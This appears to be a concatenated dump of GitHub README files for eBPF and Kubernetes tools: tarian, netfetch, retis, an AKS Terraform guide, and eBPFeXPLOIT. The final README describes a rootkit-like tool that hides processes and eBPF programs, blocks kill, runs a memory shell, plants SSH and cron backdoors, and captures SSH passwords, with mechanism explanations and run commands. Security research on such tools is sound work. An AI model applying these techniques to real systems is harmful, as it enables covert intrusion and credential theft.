To inject tarian-pod-agent container, tarian uses a mutating admission webhook. The webhook server runs on port `9443`. So, we need
to create a new firewall rule to allow ingress from master IP address range to nodes on tcp port **9443**.

For more details, see GKE docs on this topic: [https://cloud.google.com/kubernetes-engine/docs/how-to/private-clusters#add_firewall_rules](https://cloud.google.com/kubernetes-engine/docs/how-to/private-clusters#add_firewall_rules).


## Usage

### Use tarianctl to control tarian-server

1. Download from Github [release page](https://github.com/kube-tarian/tarian/releases)
2. Extract the file and copy tarianctl to your PATH directory
3. Expose tarian-server to your machine, through Ingress or port-forward. For this example, we'll use port-forward:

```bash
kubectl port-forward svc/tarian-server -n tarian-system 41051:80
```

4. Configure server address with env var

```
export TARIAN_SERVER_ADDRESS=localhost:41051
```

### To see violation events

```bash
tarianctl get events
```

### Add a process constraint

```bash
tarianctl add constraint --name nginx --namespace default \
  --match-labels run=nginx \
  --allowed-processes=pause,tarian-pod-agent,nginx 
```

```bash
tarianctl get constraints
```

### Add a file constraint

```bash
tarianctl add constraint --name nginx-files --namespace default \
  --match-labels run=nginx \
  --allowed-file-sha256sums=/usr/share/nginx/html/index.html=38ffd4972ae513a0c79a8be4573403edcd709f0f572105362b08ff50cf6de521
```

```bash
tarianctl get constraints
```

### Run tarian agent in a pod

Then after the constraints are created, we inject tarian-pod-agent to the pod by adding an annotation:

```yaml
metadata:
  annotations:
    pod-agent.k8s.tarian.dev/threat-scan: ""true""
```

Pod with this annotation will have an additional container injected (tarian-pod-agent). The tarian-pod-agent container will 
continuously verify the runtime environment based on the registered constraints. Any violation would be reported, which would be
accessible with `tarianctl get events`.


### Demo: Try a pod that violates the constraints

```bash
kubectl apply -f https://raw.githubusercontent.com/kube-tarian/tarian/main/dev/config/monitored-pod/configmap.yaml
kubectl apply -f https://raw.githubusercontent.com/kube-tarian/tarian/main/dev/config/monitored-pod/pod.yaml

# wait for it to become ready
kubectl wait --for=condition=ready pod nginx

# simulate unknown process runs
kubectl exec -ti nginx -c nginx -- sleep 15

# you should see it reported in tarian
tarianctl get events
```

## Alert Manager Integration

Tarian comes with Prometheus Alert Manager by default. If you want to use another alert manager instance:

```bash
helm install tarian-server tarian/tarian-server --devel \
  --set server.alert.alertManagerAddress=http://alertmanager.monitoring.svc:9093 \
  --set alertManager.install=false \
  -n tarian-system
```

To disable it, you can set the alertManagerAddress value to empty.

## Troubleshooting

See [docs/troubleshooting.md](docs/troubleshooting.md)

## Automatic Constraint Registration

When tarian-pod-agent runs in registration mode, instead of reporting unknown processes and files as violations, it automatically registers them as a new constraint. This is convenient to save time from registering manually.

To enable constraint registration, the cluster-agent needs to be configured.

```bash
helm install tarian-cluster-agent tarian/tarian-cluster-agent --devel -n tarian-system \
  --set clusterAgent.enableAddConstraint=true
```

```yaml
metadata:
  annotations:
    # register both processes and file checksums
    pod-agent.k8s.tarian.dev/register: ""processes,files""
    # ignore specific paths from automatic registration
    pod-agent.k8s.tarian.dev/register-file-ignore-paths: ""/usr/share/nginx/**/*.txt""
```

Automatic constraint registration can also be done in a dev/staging cluster, so that there would be less changes in production.

## Other supported annotations

```yaml
metadata:
  annotations:
    # specify how often tarian-pod-agent should verify file checksum
    pod-agent.k8s.tarian.dev/file-validation-interval: ""1m""
```

## Securing tarian-server with TLS

To secure tarian-server with TLS, create a secret containing the TLS certificate. You can create the secret manually,
or using [Cert Manager](https://cert-manager.io/). Once you have the secret, you can pass the name to the helm chart value:

```
helm upgrade -i tarian-server tarian/tarian-server --devel -n tarian-system \
  --set server.tlsSecretName=tarian-server-tls
```

## Contributing

See [docs/contributing.md](docs/contributing.md)

## Code of Conduct
See [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)

## CodeOwners & Maintainers list
See [MAINTAINERS.md](MAINTAINERS.md)

## Join our Slack channel "" tarian ""
[Kube-Tarian-Slack](https://join.slack.com/t/kube-tarian/shared_invite/zt-118iqu4g6-wopEIyjqD_uy5uXRDChaLA)
"
ddosify/bpf-verifier-errors,1,0,1,0,C,,2024-01-11T07:47:58Z,2024-06-11T15:19:29Z,2,"# bpf-verifier-errors

This repo contains common bpf verifier errors.
Demonstrates by flawed and corrected examples."
deggja/netfetch,444,25,444,21,Go,Kubernetes tool for scanning clusters for network policies and identifying unprotected workloads.,2023-11-21T20:17:27Z,2025-09-22T12:02:16Z,547,"<div align=""center"">
  <a href=""https://go.dev/"">
    <img src=""https://img.shields.io/badge/Go-v1.21-brightgreen.svg"" alt=""go version"">
  </a>
  <a href=""https://d3js.org/"">
    <img src=""https://img.shields.io/badge/D3-v7.8.5-brightgreen.svg"" alt=""d3 version"">
  </a>
  <a href=""https://nodejs.org/"">
    <img src=""https://img.shields.io/badge/Node-v21.5.0-brightgreen.svg"" alt=""node version"">
  </a>
  <a href=""https://vuejs.org/"">
    <img src=""https://img.shields.io/badge/Vue-v5.0.8-brightgreen.svg"" alt=""vue version"">
  </a>
</div>


<div align=""center"">

  <h1>Netfetch</h1>
  <h3>Scan your Kubernetes clusters to identifiy unprotected workloads and map your existing Network policies</h3>
  
  <img src=""https://github.com/deggja/netfetch/assets/17279882/64306f2f-abbf-462c-97d6-a326ca70c2ad"" width=""130px"" alt=""Netfetch""/>

</div>

## Contents
- [**What is this project?**](#-what-is-this-project-)
  - [Support](#networkpolicy-type-support-in-netfetch)
- **[Installation](#installation)**
  - [Install with brew](#installation-via-homebrew-for-mac-)
  - [Install in Kubernetes](#installation-via-helm-)
- [**Usage**](#usage)
  - [Get started](#get-started)
  - [Dashboard](#using-the-dashboard-)
  - [Score](#netfetch-score-)
  - [Uninstalling](#uninstalling-netfetch)
- [**Contribute**](#contribute-)

## â­ What is this project â­

This project aims to demystify network policies in Kubernetes. It's a work in progress!

The `netfetch` tool will scan your Kubernetes cluster and let you know if you have any pods running without being targeted by network policies.

| Feature                                                                | CLI  | Dashboard |
|------------------------------------------------------------------------|------|-----------|
| Scan cluster identify pods without network policies                    | âœ“    | âœ“         |
| Save scan output to a text file                                        | âœ“    |           |
| Visualize network policies and pods in a interactive network map       |      | âœ“         |
| Create default deny network policies where this is missing             | âœ“    | âœ“         |
| Get suggestions for network policies based on existing workloads       |      | âœ“         |
| Calculate a security score based on scan findings                      | âœ“    | âœ“         |
| Scan a specific policy by name to see what pods it  targets            | âœ“    |           |

### NetworkPolicy type support in Netfetch

| Type      | CLI  | Dashboard |
|-----------|------|-----------|
| Kubernetes| âœ“    | âœ“         |
| Cilium    | âœ“    |           |

Support for additional types of network policies is in the works. No support for the type you need? Check out [issues](https://github.com/deggja/netfetch/issues) for an existing request or create a new one if there is none.

## Installation
### Installation via Homebrew for Mac ðŸ’»

You can install `netfetch` using our Homebrew tap:

```sh
brew tap deggja/netfetch https://github.com/deggja/netfetch
brew install netfetch
```

For specific Linux distros, Windows and other install binaries, check the latest release.

### Installation via Helm ðŸŽ©

You can deploy the `netfetch` dashboard in your Kubernetes clusters using Helm.

```sh
helm repo add deggja https://deggja.github.io/netfetch/
helm repo update
helm install netfetch deggja/netfetch --namespace netfetch --create-namespace
```

Follow the instructions after deployment to access the dashboard.

#### Prerequisites ðŸŒŒ

- Installed `netfetch` via homebrew or a release binary.
- Access to a Kubernetes cluster with `kubectl` configured.
- Permissions to read and create network policies.

## Usage

### Get started

The primary command provided by `netfetch` is `scan`. This command scans all non-system Kubernetes namespaces for network policies.

You can also scan specific namespaces by specifying the name of that namespace.

You may add the --dryrun or -d flag to run a dryrun of the scan. The application will not prompt you about adding network policies, but still give you the output of the scan.

Run `netfetch` in dryrun against a cluster.

```sh
netfetch scan --dryrun
```

You can also specify the desired kubeconfig file by using the `--kubeconfig /path/to/config` flag.

```sh
netfetch scan --kubeconfig /Users/xxx/.kube/config
```

Run `netfetch` in dryrun against a namespace

```sh
netfetch scan crossplane-system --dryrun
```

![netfetch-demo](https://github.com/deggja/netfetch/assets/15778492/015e9d9f-a678-4a14-a8bd-607f02c13d9f)

Scan entire cluster.

```sh
netfetch scan
```

Scan a namespace called crossplane-system.

```sh
netfetch scan crossplane-system
```

Scan entire cluster for Cilium Network Policies and or Cluster Wide Cilium Network Policies.

```sh
netfetch scan --cilium
```

Scan a namespace called production for regular Cilium Network Policies.

```sh
netfetch scan production --cilium
```

Scan a specific network policy.

```sh
netfetch scan --target my-policy-name
```

Scan a specific Cilium Network Policy.

```sh
netfetch scan --cilium --target default-cilium-default-deny-all
```

[![asciicast](https://asciinema.org/a/661200.svg)](https://asciinema.org/a/661200)

### Using the dashboard ðŸ“Ÿ

Launch the dashboard:

```sh
netfetch dash
```

You may also specify a port for the dashboard to run on (default is 8080).

```sh
netfetch dash --port 8081
```

### Dashboard functionality overview

The Netfetch Dashboard offers an intuitive interface for interacting with your Kubernetes cluster's network policies. Below is a detailed overview of the functionalities available through the dashboard:

| Action               | Description                                                                                                     | Screenshot Link                                                 |
|----------------------|-----------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------|
| Scan Cluster         | Initiates a cluster-wide scan to identify pods without network policies, similar to `netfetch scan`.            | ![Netfetch Dashboard](https://github.com/deggja/netfetch/blob/main/frontend/dash/src/assets/new-dash.png) |
| Scan Namespace       | Scans a selected namespace for pods not covered by network policies, equivalent to `netfetch scan namespace`.   | ![Cluster map](https://github.com/deggja/netfetch/blob/main/frontend/dash/src/assets/new-clustermap.png) |
| Create Cluster Map   | Generates a D3-rendered network map of all pods and policies across accessible namespaces.                      | ![Network map](https://github.com/deggja/netfetch/blob/main/frontend/dash/src/assets/new-ns.png) |
| Suggest Policy       | Provides network policy suggestions based on existing workloads within a selected namespace.                     | ![Suggested policies](https://github.com/deggja/netfetch/blob/main/frontend/dash/src/assets/new-suggestpolicy.png) |

### Interactive Features

- **Table View**: Shows pods not targeted by network policies. It updates based on the cluster or namespace scans.
- **Network Map Visualization**: Rendered using D3 to show how pods and policies interact within the cluster.
- **Policy Preview**: Double-click network policy nodes within the network map to view policy YAML.
- **Policy Editing**: Edit suggested policies directly within the dashboard or copy the YAML for external use.


### Netfetch score ðŸ¥‡

The `netfetch` tool provides a basic score at the end of each scan. The score ranges from 1 to 100, with 1 being the lowest and 100 being the highest possible score.

Your score will decrease based on the amount of workloads in your cluster that are running without being targeted by a network policy.

The score reflects the security posture of your Kubernetes namespaces based on network policies and general policy coverage. If changes are made based on recommendations from the initial scan, rerunning `netfetch` will likely result in a higher score.

### Uninstalling netfetch

If you want to uninstall the application - you can do so by running the following commands.

```
brew uninstall netfetch
brew cleanup -s netfetch
brew untap deggja/netfetch https://github.com/deggja/netfetch
```

## Running Tests

To run tests for netfetch, follow these steps:

1. Navigate to the root directory of the project in your terminal.

2. Navigate to the backend directory within the project:

```
cd backend
```

3. Run the following command to execute all tests in the project:

```
go test ./...
```

This command will recursively search for tests in all subdirectories (./...) and run them.

4. After executing the command, you will see the test results in the terminal output.

## Contribute ðŸ”¨
Thank you to the following awesome people:

- [roopeshsn](https://github.com/roopeshsn)
- [s-rd](https://github.com/s-rd)
- [JJGadgets](https://github.com/JJGadgets)
- [Home Operations Discord](https://github.com/onedr0p/home-ops)
- [pehlicd](https://github.com/pehlicd)


You are welcome to contribute!

See [CONTRIBUTING](CONTRIBUTING.md) for instructions on how to proceed.

## Tools ðŸ§°
Netfetch uses other tools for a plethora of different things. It would not be possible without the following:

- [statik](https://github.com/rakyll/statik)
- [D3](https://d3-graph-gallery.com/network.html)
- [Helm](https://helm.sh/docs/)
- [Brew](https://brew.sh/)
- [lipgloss](https://github.com/charmbracelet/lipgloss)

## License

Netfetch is distributed under the MIT License. See the [LICENSE](LICENSE) for more information.
"
amitmavgupta/azure-terraform,28,9,28,0,HCL,AKS clusters created with different CNI's using Terraform,2023-08-17T16:55:23Z,2025-07-08T21:32:38Z,347,"# What is the main purpose of the repo?
This repo will discuss how to deploy **Cilium on AKS clusters with Terraform**:
* Isovalent Enterprise for Cilium in Azure Marketplace (Overlay mode).
* Isovalent Enterprise for Cilium in Azure Marketplace (Dynamic IP allocation mode).
* Isovalent Enterprise for Cilium in Azure Marketplace (Overlay Mode) (Azure Linux as the host OS).
* Isovalent Enterprise for Cilium in Azure Marketplace (Dynamic IP allocation mode) (Azure Linux as the host OS).
* Isovalent Enterprise for Cilium in Azure Marketplace on a private AKS cluster (Overlay mode).
* Isovalent Enterprise for Cilium in Azure Marketplace on a private AKS cluster (Dynamic IP allocation mode).
* Bring your own CNI (BYOCNI) in IPv4 and Dual Stack mode.
* Bring your own CNI (BYOCNI) with Azure Linux as the host OS in IPv4 and Dual Stack mode.
* Bring your own CNI (BYOCNI) with Azure Linux version 3.
* Bring your own CNI (BYOCNI) for a Private AKS cluster.
* Bring your own CNI (BYOCNI) with ARM based nodepools support.
* Bring your own CNI (BYOCNI) with KEDA (Kubernetes Event Driven Autoscaler) support

You will also get to learn how to deploy an **AKS cluster using the other AKS CNI's like**:
* Kubenet in IPv4 and Dual Stack mode.
* Azure CNI powered by Cilium (Overlay Mode) with Cilium as the Network Policy in IPv4 and Dual Stack mode.
* Azure CNI powered by Cilium (Dynamic IP allocation) with Cilium as the Network Policy.
* Azure CNI powered by Cilium (Overlay Mode) with Azure Linux as the host OS in IPv4 and Dual Stack mode.
* Azure CNI powered by Cilium (Dynamic IP allocation) with Azure Linux as the host OS.
* Azure CNI powered by Cilium (Overlay Mode) for a Private AKS cluster.
* Azure CNI powered by Cilium (Dynamic IP allocation) for a Private AKS cluster.
* Nodepools in Different Availability Zones (with Azure CNI powered by Cilium as the choice of CNI).
* Azure CNI Overlay in IPv4 and Dual Stack mode .
* Azure CNI with Azure NPM as the network policy.
* Azure CNI with Calico as the network policy.

# Ensure you have enough quota
Go to the Subscription blade, navigate to ""Usage + Quotas"", and make sure you have enough quota for the following resources:

- Regional vCPUs
- Standard Dv4 Family vCPUs
"
retis-org/retis,513,33,513,31,Rust,Tracing packets in the Linux networking stack & friends,2022-09-26T14:24:08Z,2025-10-10T10:45:29Z,1672,"# Retis

Tracing (filtered) packets in the [Linux](https://kernel.org) networking stack,
using [eBPF](https://ebpf.io) probes and interfacing with control and data paths
such as [OvS](https://www.openvswitch.org) or [Netfilter](https://netfilter.org).

Visit the [online documentation](https://retis.readthedocs.io) for more
details, or run `retis --help` and `retis <command> --help`.

![demo](demo.gif)

## Installation

Retis can be used as a container image, installed on supported distributions or
built from sources. All details on the [official
documentation](https://retis.readthedocs.io/en/stable/install/).

## Use cases

Retis aims at providing better visibility on complex single-host topologies and
linking useful context. It it designed to be modular in terms of what kind of
data is retrieved and where it is retrieved from. Retis can be used for
debugging networking issues, exploring the Linux networking stack or for testing
features (eg. in a CI script).

A few key points:

- Operates on ""skb-enabled"" functions and tracepoints.
- Offers filtering and tracking (the same packet can be seen multiple times,
  modified, etc) capabilities.
- Can retrieve more than the packet itself: additional metadata and contextual
  information.
- Does not require compilation on the target.
- Has post-processing abilities (eg. reconstructing a packet journey).
- Tries to have sane defaults.

Collecting packet events going in and out network devices (similarly to
well-known `AF_PACKET` existing utilities) can be as simple as:

```
$ retis collect
Collector(s) started: ct, nft, dev, skb, skb-drop, skb-tracking, ns
No probe(s) given: using tp:net:netif_receive_skb, tp:net:net_dev_start_xmit
7 probe(s) loaded

10041392747167 (9) [ping] 23932 [tp] net:net_dev_start_xmit #921f1a5d29fffff8ca2dd79f440 (skb ffff8ca30bbc3100)
  [redacted] > 2606:4700:4700::1111 ttl 64 label 0x18000 len 64 proto ICMPv6 (58) type 128 code 0
  ns 0x1/4026531840 if 4 (wlp82s0)

10041404857427 (0) [irq/177-iwlwifi] 1907 [tp] net:netif_receive_skb #921f25e9c53ffff8ca1c2e62100 (skb ffff8ca00f09f500)
  2606:4700:4700::1111 > [redacted] ttl 54 label 0xb57aa len 64 proto ICMPv6 (58) type 129 code 0
  ns 0x1/4026531840 if 4 (wlp82s0)
```

The output is described in the [official
documentation](https://retis.readthedocs.io/en/stable/).

More advanced collections can be performed by providing more probes and by
adding filtering rules. For example one can use the [generic
profile](retis/profiles/generic.yaml) which defines a bigger set of probes.

```
$ retis -p generic collect -f 'udp port 53 and host 2606:4700:4700::1111'
L2+L3 packet filter(s) loaded
30 probe(s) loaded

12313349514683 (1) [isc-net-0000] 26822/26823 [k] ip6_output #b32ecd2e5bbffff8ca00f0c6100 (skb ffff8ca396cf4600)
  [redacted].43366 > 2606:4700:4700::1111.53 ttl 64 label 0x10c7e len 59 proto UDP (17) len 51
  ns 0x1/4026531840
  ct_state NEW status 0x100 udp orig [[redacted].43366 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].43366] zone 0 mark 0

12313349527752 (1) [isc-net-0000] 26822/26823 [tp] net:net_dev_queue #b32ecd2e5bbffff8ca00f0c6100 (skb ffff8ca396cf4600)
  [redacted].43366 > 2606:4700:4700::1111.53 ttl 64 label 0x10c7e len 59 proto UDP (17) len 51
  ns 0x1/4026531840 if 4 (wlp82s0)
  ct_state NEW status 0x188 udp orig [[redacted].43366 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].43366] zone 0 mark 0

12313349531477 (1) [isc-net-0000] 26822/26823 [tp] net:net_dev_start_xmit #b32ecd2e5bbffff8ca00f0c6100 (skb ffff8ca396cf4600)
  [redacted].43366 > 2606:4700:4700::1111.53 ttl 64 label 0x10c7e len 59 proto UDP (17) len 51
  ns 0x1/4026531840 if 4 (wlp82s0)
  ct_state NEW status 0x188 udp orig [[redacted].43366 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].43366] zone 0 mark 0

12313364132752 (4) [irq/181-iwlwifi] 1911 [tp] net:napi_gro_receive_entry #b32edb1f390ffff8ca3036e3c80 (skb ffff8ca325f87900)
  2606:4700:4700::1111.53 > [redacted].43366 ttl 54 label 0xfe6f0 len 79 proto UDP (17) len 71
  ns 0x1/4026531840 if 4 (wlp82s0)

12313364139400 (4) [irq/181-iwlwifi] 1911 [k] udp6_gro_receive #b32edb1f390ffff8ca3036e3c80 (skb ffff8ca325f87900)
  2606:4700:4700::1111.53 > [redacted].43366 ttl 54 label 0xfe6f0 len 79 proto UDP (17) len 71
  ns 0x1/4026531840 if 4 (wlp82s0)

12313364141628 (4) [irq/181-iwlwifi] 1911 [k] udp_gro_receive #b32edb1f390ffff8ca3036e3c80 (skb ffff8ca325f87900)
  2606:4700:4700::1111.53 > [redacted].43366 ttl 54 label 0xfe6f0 len 79 proto UDP (17) len 71
  ns 0x1/4026531840 if 4 (wlp82s0)

12313364143661 (4) [irq/181-iwlwifi] 1911 [tp] net:netif_receive_skb #b32edb1f390ffff8ca3036e3c80 (skb ffff8ca325f87900)
  2606:4700:4700::1111.53 > [redacted].43366 ttl 54 label 0xfe6f0 len 79 proto UDP (17) len 71
  ns 0x1/4026531840 if 4 (wlp82s0)

12313364186036 (4) [irq/181-iwlwifi] 1911 [k] udpv6_rcv #b32edb1f390ffff8ca3036e3c80 (skb ffff8ca325f87900)
  2606:4700:4700::1111.53 > [redacted].43366 ttl 54 label 0xfe6f0 len 79 proto UDP (17) len 71
  ns 0x1/4026531840 if 4 (wlp82s0) rxif 4
  ct_state REPLY status 0x18a udp orig [[redacted].43366 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].43366] zone 0 mark 0
```

When storing events for later post-processing, the packets' journeys can be
reconstructed:

```
$ retis -p generic collect -f 'udp port 53 and host 2606:4700:4700::1111' -o \
      --cmd 'dig redhat.com @2606:4700:4700::1111'
$ retis sort
12510323851756 (1) [isc-net-0000] 27137/27138 [k] ip6_output #b60c968c1ecffff8ca27999de40 (skb ffff8ca325f86100) n 0
  [redacted].46050 > 2606:4700:4700::1111.53 ttl 64 label 0xa92bf len 59 proto UDP (17) len 51
  ns 0x1/4026531840
  ct_state NEW status 0x100 udp orig [[redacted].46050 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].46050] zone 0 mark 0
  â†³ 12510323863992 (1) [isc-net-0000] 27137/27138 [tp] net:net_dev_queue #b60c968c1ecffff8ca27999de40 (skb ffff8ca325f86100) n 1
      [redacted].46050 > 2606:4700:4700::1111.53 ttl 64 label 0xa92bf len 59 proto UDP (17) len 51
      ns 0x1/4026531840 if 4 (wlp82s0)
      ct_state NEW status 0x188 udp orig [[redacted].46050 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].46050] zone 0 mark 0
  â†³ 12510323867976 (1) [isc-net-0000] 27137/27138 [tp] net:net_dev_start_xmit #b60c968c1ecffff8ca27999de40 (skb ffff8ca325f86100) n 2
      [redacted].46050 > 2606:4700:4700::1111.53 ttl 64 label 0xa92bf len 59 proto UDP (17) len 51
      ns 0x1/4026531840 if 4 (wlp82s0)
      ct_state NEW status 0x188 udp orig [[redacted].46050 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].46050] zone 0 mark 0

12510336743330 (0) [irq/177-iwlwifi] 1907 [tp] net:napi_gro_receive_entry #b60ca2d77a2ffff8ca2fcc582c0 (skb ffff8ca303bd0c00) n 0
  2606:4700:4700::1111.53 > [redacted].46050 ttl 54 label 0xc8017 len 79 proto UDP (17) len 71
  ns 0x1/4026531840 if 4 (wlp82s0)
  â†³ 12510336748601 (0) [irq/177-iwlwifi] 1907 [k] udp6_gro_receive #b60ca2d77a2ffff8ca2fcc582c0 (skb ffff8ca303bd0c00) n 1
      2606:4700:4700::1111.53 > [redacted].46050 ttl 54 label 0xc8017 len 79 proto UDP (17) len 71
      ns 0x1/4026531840 if 4 (wlp82s0)
  â†³ 12510336750432 (0) [irq/177-iwlwifi] 1907 [k] udp_gro_receive #b60ca2d77a2ffff8ca2fcc582c0 (skb ffff8ca303bd0c00) n 2
      2606:4700:4700::1111.53 > [redacted].46050 ttl 54 label 0xc8017 len 79 proto UDP (17) len 71
      ns 0x1/4026531840 if 4 (wlp82s0)
  â†³ 12510336752512 (0) [irq/177-iwlwifi] 1907 [tp] net:netif_receive_skb #b60ca2d77a2ffff8ca2fcc582c0 (skb ffff8ca303bd0c00) n 3
      2606:4700:4700::1111.53 > [redacted].46050 ttl 54 label 0xc8017 len 79 proto UDP (17) len 71
      ns 0x1/4026531840 if 4 (wlp82s0)
  â†³ 12510336766269 (0) [irq/177-iwlwifi] 1907 [k] udpv6_rcv #b60ca2d77a2ffff8ca2fcc582c0 (skb ffff8ca303bd0c00) n 4
      2606:4700:4700::1111.53 > [redacted].46050 ttl 54 label 0xc8017 len 79 proto UDP (17) len 71
      ns 0x1/4026531840 if 4 (wlp82s0) rxif 4
      ct_state REPLY status 0x18a udp orig [[redacted].46050 > 2606:4700:4700::1111.53] reply [2606:4700:4700::1111.53 > [redacted].46050] zone 0 mark 0
```

Retis offers many more features including retrieving [conntrack
information](https://retis.readthedocs.io/en/stable/modules/ct/), [advanced
filtering](https://retis.readthedocs.io/en/stable/filtering/), [monitoring
dropped packets](https://retis.readthedocs.io/en/stable/profiles/#dropmon) and
[dropped packets from Netfilter](https://retis.readthedocs.io/en/stable/profiles/#nft-dropmon),
generating `pcap` files from the collected packets, allowing [writing
post-processing scripts in Python](https://retis.readthedocs.io/en/stable/python/)
and more.

## Contributing

Retis is under [GPL v2](retis/LICENSE) and welcomes contributions. See our
[contributing guide](https://retis.readthedocs.io/en/stable/CONTRIBUTING/) for
more details.
"
bfengj/eBPFeXPLOIT,193,26,193,1,C,Exploit tool implemented using ebpf.,2024-01-06T05:30:18Z,2025-10-03T15:33:32Z,47,"# eBPFeXPLOIT



eBPFeXPLOIT is a penetration testing tool based on eBPF technology.

**Current Features:**

- **Hide its own PID and up to four other specified PIDs, with a maximum of five PIDs hidden for ease of processing.**
- **eBPF memory horse (MemoryShell).**
- **Block the Kill command. Processes with specified PIDs will not be terminated by Kill.**
- **Hide injected eBPF programs, Maps, and Links in the kernel.**
- **ssh backdoor**
- **catch the username and password of SSH**
- **cron backdoor (can be used for container escape)**



[ä¸­æ–‡ç‰ˆæœ¬(Chinese version)](./README.zh-cn.md)

## Hide Pid

Hide up to four target PIDs and its own PID, totaling five PIDs. By default, it hides its own PID.

```bash
go generate && go build -o main && ./main -pid 263959,269942

echo $$
263959
ps aux | grep -i ""263959""
root      277863  0.0  0.0   3440  1920 pts/2    S+   13:51   0:00 grep --color=auto -i 263959
```

The principle of hiding PIDs lies in the `getdents64` system call. In Linux, the `getdents64` system call reads file information in a directory, and commands like `ps` use `getdents64` to obtain process-related information from files in the `/proc/` directory.

The second parameter of `ctx` is `linux_dirent64 *dirp`, structured as follows:

```c
struct linux_dirent64 {
    u64        d_ino;    /* 64-bit inode number */
    u64        d_off;    /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char  d_type;   /* File type */
    char           d_name[]; /* Filename (null-terminated) */ };
```

It represents the entries in the directory that `getdents64` will access. The first two fields are less significant, the third indicates the length of the current `linux_dirent64`, and the fifth `d_name` is the filename of the target, e.g., for `pid` 200, it would be `/proc/200`, so `d_name` is 200.

By hooking this process and modifying the `d_reclen` of the previous `linux_dirent64` to `d_reclen_previous + d_reclen`, the target PID's file can be skipped, thus hiding the PID.

However, due to complex logic, hiding too many PIDs can cause the verifier to fail, so including the program itself, a maximum of five can be hidden.

## ebpf-MemoryShell

It can implement basic MemoryShell functionality, but there are a series of issues:

- Temporary lack of handling for fragmented transmission.
- My local Linux VM has issues, unable to properly configure tc to only receive egress traffic, resulting in tc receiving both egress and ingress traffic, which relatively decreases performance.
- Command execution is in user space.
- Command execution must be placed in the last parameter of get, as otherwise, it's too complex for eBPF kernel-side processing and fails to pass the verifier.
- The original HTTP response byte count must be larger than the command execution result byte count for complete echo back. I tried expanding the HTTP response packet. It's possible to use `bpf_skb_change_tail` for expansion, but it's also necessary to modify the `Content-Length` value in the HTTP response header, which is very complex and fails to pass the verifier.

In terms of network packet processing performance, XDP is superior to TC, which is superior to hooking syscalls. Therefore, XDP is always the first choice, but XDP can only receive ingress traffic, while TC can receive egress traffic, so they are processed separately.



XDP sends the received commands to user space for execution, and then the user space sends the execution results back to TC, writing the results into the HTTP response. If the execution results are to be fully echoed back, an HTTP response with more bytes than the result is generally easy to find.

Although the `dexec` option is provided, the functionality of `dexec=0` has not yet been implemented.

```bash

./main --help
Usage of ./main:
  -dexec string
        directly exec or not (default ""-1"")
  -ifname string
        interface xdp and tc will attach
  -pid string
        pid to hide (default ""-1"")

./main -ifname lo -dexec 1
```



![image-20240109131903910](README_EN.assets/image-20240109131903910.png)

## Prevent Kill

Even if the PID is hidden, if the operations team still somehow knows our program's PID, we need to prevent the Kill command from terminating our process.

First, hook `lsm/task_kill`, and when encountering a protected PID, `return -EPERM` to prevent subsequent execution.

Also, hook `kretprobe/sys_kill`, and when the syscall returns, modify the return value to `-ESRCH` to pretend the process does not exist:

```bash

go build -o main && ./main
2024/01/06 19:19:40 current pid:398235
2024/01/06 19:19:40 Waiting for events..

kill -9 398235
bash: kill: (398235) - No such process
```

I considered using kprobe or tp, but there was no good way to prevent subsequent processing at the time of entry, so I had to use lsm, but it doesn't seem like the best method.

I considered directly overwriting the return in kprobe, but I always had trouble correctly getting the PID parameter without using the `BPF_KPROBE` macro. It might be a problem with my VM, as I've been developing under a very high version of the Linux kernel and on arm64 architecture. It seems there are significant issues, and I need to find a way to develop remotely on an amd64 architecture Linux (since I'm developing eBPF on a Mac VM).



## Hide eBPF Program

Although the user-space program's PID is hidden, commands like `bpftool prog list` can still discover our eBPF program injected into the kernel. However, considering that most Linux systems won't install `bpftool`, and operations might not even know what eBPF is, the likelihood of the injected eBPF program being discovered is very low. Therefore, this part of the process is relatively simple. Refer to the content in the book ""Learning eBPF"". Viewing progs or maps generally goes through the following process:

```bash

[0000ffffb38e1aa8] bpf(BPF_PROG_GET_NEXT_ID, {start_id=0, next_id=0, open_flags=0}, 12) = 0
[0000ffffb38e1aa8] bpf(BPF_PROG_GET_FD_BY_ID, {prog_id=2, next_id=0, open_flags=0}, 12) = 3
[0000ffffb38e1aa8] bpf(BPF_OBJ_GET_INFO_BY_FD, {info={bpf_fd=3, info_len=232, info=0xffffc95ef490}}, 16) = 0
```

First, use `BPF_PROG_GET_NEXT_ID` to get the ID, then `BPF_PROG_GET_FD_BY_ID` to get the fd, and finally `BPF_OBJ_GET_INFO_BY_FD` to get the related obj. This process repeats until `BPF_PROG_GET_NEXT_ID` can't find a related ID.

Therefore, directly hook the bpf syscall, and when encountering `BPF_PROG_GET_NEXT_ID`, `BPF_MAP_GET_NEXT_ID`, and `BPF_LINK_GET_NEXT_ID`, process accordingly.



## ssh backdoor

The ssh backdoor is based on the following principle:

1. Generate a key pair: First, generate a pair of keys on the client side, including a public key and a private key. Key pairs are usually generated using RSA or DSA algorithms. The private key should be kept confidential, while the public key can be distributed where needed;
2. Distribute the public key: Copy the public key generated by the client to the `~/.ssh/authorized_keys` file on the target host where passwordless login is to be enabled. This file stores a list of public keys that are allowed to access the host;
3. Connection authentication: When the client attempts to connect to the target host, the target host sends a random challenge to the client. The client uses its private key to sign the challenge and sends the signature back to the target host;
4. Verify the signature: The target host uses the previously stored client public key to verify the signature sent by the client. If the signature verification is successful, the target host confirms the identity of the client and allows passwordless login.



When ssh login in with a key, it reads the public key in the `authorised_keys` file. A hidden ssh backdoor can be achieved by using the eBPF program to hook systems such as openat and read, and replacing the public key in `authorized_keys` with our own.

The program fills the target `authorised_keys` with a lot of spaces, considering that there may not be enough bytes inside the previous `authorized_keys`.



## Catch Ssh Username and Password

hook `pam_get_authtok` to catch ssh username and password. Requires an absolute path of  `libpam.so.0`.

## Cron backdoor

Idea from [Cloud Native Security Attack and Defence | Analysis and Practice of Container Escape Techniques Using eBPF](https://mp.weixin.qq.com/s/Psqy3X3VdUPga7f2cnct1g)

